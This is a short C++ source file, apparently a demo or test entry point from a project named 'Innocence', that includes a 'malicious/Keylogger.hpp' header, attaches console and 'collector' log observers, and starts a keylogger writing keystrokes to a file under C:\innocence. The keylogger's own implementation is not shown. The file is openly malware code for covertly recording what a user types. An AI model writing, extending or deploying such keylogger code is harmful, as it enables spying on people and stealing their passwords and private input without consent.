#include <common/Log.hpp>
#include <malicious/Keylogger.hpp>
#include <system/Process.hpp>
using namespace System;
using namespace Malicious;

#include <Innocence.hpp>

int main()
{
    TRACE_FUNCTION
	LOG.setIdentity(Innocence::identity);
    LOG.addObserver(new Common::LogToConsole);
    LOG.addObserver(new Common::LogToCollector);
    Keylogger::instance().setKeylog("C:\\innocence\\output.txt");
    Keylogger::instance().start();
	system("pause");
	return EXIT_SUCCESS;
}
